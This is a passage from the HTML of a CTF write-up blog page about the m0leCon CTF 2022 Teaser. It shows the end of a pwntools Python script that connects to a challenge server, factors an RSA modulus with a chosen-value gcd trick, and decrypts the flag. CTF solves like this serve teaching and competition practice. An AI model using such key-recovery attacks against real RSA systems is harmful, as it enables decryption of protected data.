style=color:#ae81ff>173</span>, <span style=color:#ae81ff>179</span>, <span style=color:#ae81ff>181</span>, <span style=color:#ae81ff>191</span>, <span style=color:#ae81ff>193</span>, <span style=color:#ae81ff>197</span>, <span style=color:#ae81ff>199</span>, <span style=color:#ae81ff>211</span>, <span style=color:#ae81ff>223</span>, <span style=color:#ae81ff>227</span>, <span style=color:#ae81ff>229</span>, <span style=color:#ae81ff>233</span>, <span style=color:#ae81ff>239</span>, <span style=color:#ae81ff>241</span>, <span style=color:#ae81ff>251</span>, <span style=color:#ae81ff>257</span>, <span style=color:#ae81ff>263</span>, <span style=color:#ae81ff>269</span>, <span style=color:#ae81ff>271</span>, <span style=color:#ae81ff>277</span>, <span style=color:#ae81ff>281</span>, <span style=color:#ae81ff>283</span>, <span style=color:#ae81ff>293</span>, <span style=color:#ae81ff>307</span>, <span style=color:#ae81ff>311</span>, <span style=color:#ae81ff>313</span>, <span style=color:#ae81ff>317</span>, <span style=color:#ae81ff>331</span>, <span style=color:#ae81ff>337</span>, <span style=color:#ae81ff>347</span>, <span style=color:#ae81ff>349</span>, <span style=color:#ae81ff>353</span>, <span style=color:#ae81ff>359</span>, <span style=color:#ae81ff>367</span>, <span style=color:#ae81ff>373</span>, <span style=color:#ae81ff>379</span>, <span style=color:#ae81ff>383</span>, <span style=color:#ae81ff>389</span>, <span style=color:#ae81ff>397</span>, <span style=color:#ae81ff>401</span>, <span style=color:#ae81ff>409</span>, <span style=color:#ae81ff>419</span>, <span style=color:#ae81ff>421</span>, <span style=color:#ae81ff>431</span>, <span style=color:#ae81ff>433</span>, <span style=color:#ae81ff>439</span>, <span style=color:#ae81ff>443</span>, <span style=color:#ae81ff>449</span>, <span style=color:#ae81ff>457</span>, <span style=color:#ae81ff>461</span>, <span style=color:#ae81ff>463</span>, <span style=color:#ae81ff>467</span>, <span style=color:#ae81ff>479</span>, <span style=color:#ae81ff>487</span>, <span style=color:#ae81ff>491</span>, <span style=color:#ae81ff>499</span>, <span style=color:#ae81ff>503</span>, <span style=color:#ae81ff>509</span>, <span style=color:#ae81ff>521</span>, <span style=color:#ae81ff>523</span>, <span style=color:#ae81ff>541</span>, <span style=color:#ae81ff>547</span>, <span style=color:#ae81ff>557</span>, <span style=color:#ae81ff>563</span>, <span style=color:#ae81ff>569</span>, <span style=color:#ae81ff>571</span>, <span style=color:#ae81ff>577</span>, <span style=color:#ae81ff>587</span>, <span style=color:#ae81ff>593</span>, <span style=color:#ae81ff>599</span>, <span style=color:#ae81ff>601</span>, <span style=color:#ae81ff>607</span>, <span style=color:#ae81ff>613</span>, <span style=color:#ae81ff>617</span>, <span style=color:#ae81ff>619</span>, <span style=color:#ae81ff>631</span>, <span style=color:#ae81ff>641</span>, <span style=color:#ae81ff>643</span>, <span style=color:#ae81ff>647</span>, <span style=color:#ae81ff>653</span>, <span style=color:#ae81ff>659</span>, <span style=color:#ae81ff>661</span>, <span style=color:#ae81ff>673</span>, <span style=color:#ae81ff>677</span>, <span style=color:#ae81ff>683</span>, <span style=color:#ae81ff>691</span>, <span style=color:#ae81ff>701</span>, <span style=color:#ae81ff>709</span>, <span style=color:#ae81ff>719</span>, <span style=color:#ae81ff>727</span>, <span style=color:#ae81ff>733</span>, <span style=color:#ae81ff>739</span>, <span style=color:#ae81ff>743</span>, <span style=color:#ae81ff>751</span>, <span style=color:#ae81ff>757</span>, <span style=color:#ae81ff>761</span>, <span style=color:#ae81ff>769</span>, <span style=color:#ae81ff>773</span>, <span style=color:#ae81ff>787</span>, <span style=color:#ae81ff>797</span>, <span style=color:#ae81ff>809</span>, <span style=color:#ae81ff>811</span>, <span style=color:#ae81ff>821</span>, <span style=color:#ae81ff>823</span>, <span style=color:#ae81ff>827</span>, <span style=color:#ae81ff>829</span>, <span style=color:#ae81ff>839</span>, <span style=color:#ae81ff>853</span>, <span style=color:#ae81ff>857</span>, <span style=color:#ae81ff>859</span>, <span style=color:#ae81ff>863</span>, <span style=color:#ae81ff>877</span>, <span style=color:#ae81ff>881</span>, <span style=color:#ae81ff>883</span>, <span style=color:#ae81ff>887</span>, <span style=color:#ae81ff>907</span>, <span style=color:#ae81ff>911</span>, <span style=color:#ae81ff>919</span>, <span style=color:#ae81ff>929</span>, <span style=color:#ae81ff>937</span>, <span style=color:#ae81ff>941</span>, <span style=color:#ae81ff>947</span>, <span style=color:#ae81ff>953</span>, <span style=color:#ae81ff>967</span>, <span style=color:#ae81ff>971</span>, <span style=color:#ae81ff>977</span>, <span style=color:#ae81ff>983</span>, <span style=color:#ae81ff>991</span>, <span style=color:#ae81ff>997</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;challs.m0lecon.it&#34;</span>, <span style=color:#ae81ff>1753</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_ <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvlineS()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; = &#34;</span>)[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvlineS()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; = &#34;</span>)[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvlineS()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; = &#34;</span>)[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Choose a value: &#34;</span>, str(a)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> int(r<span style=color:#f92672>.</span>recvlineS()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; = &#34;</span>)[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> max(gcd(n,(pow(a, M<span style=color:#f92672>//</span>f, n)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>%</span>n) <span style=color:#66d9ef>for</span> f <span style=color:#f92672>in</span> factors)
</span></span><span style=display:flex><span>print(p)
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> n <span style=color:#f92672>//</span> p
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> p <span style=color:#f92672>*</span> q <span style=color:#f92672>==</span> n <span style=color:#f92672>and</span> p<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>and</span> q<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, (p<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>(q<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>print(long_to_bytes(pow(c, d, n)))
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://bootplug.io/tags/ctf/>ctf</a></li><li><a href=https://bootplug.io/tags/pwn/>pwn</a></li><li><a href=https://bootplug.io/tags/dirty-pipe/>dirty pipe</a></li><li><a href=https://bootplug.io/tags/ssti/>ssti</a></li></ul><nav class=paginav><a class=next href=https://bootplug.io/posts/ctf/equinorctf/><span class=title>Next Page »</span><br><span>Equinor CTF 2021</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on twitter" href="https://twitter.com/intent/tweet/?text=m0leCon%20CTF%202022%20Teaser&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f&hashtags=ctf%2cpwn%2cdirtypipe%2cssti"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f&title=m0leCon%20CTF%202022%20Teaser&summary=m0leCon%20CTF%202022%20Teaser&source=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f&title=m0leCon%20CTF%202022%20Teaser"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on whatsapp" href="https://api.whatsapp.com/send?text=m0leCon%20CTF%202022%20Teaser%20-%20https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on telegram" href="https://telegram.me/share/url?text=m0leCon%20CTF%202022%20Teaser&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://bootplug.io/>Blog | bootplug</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>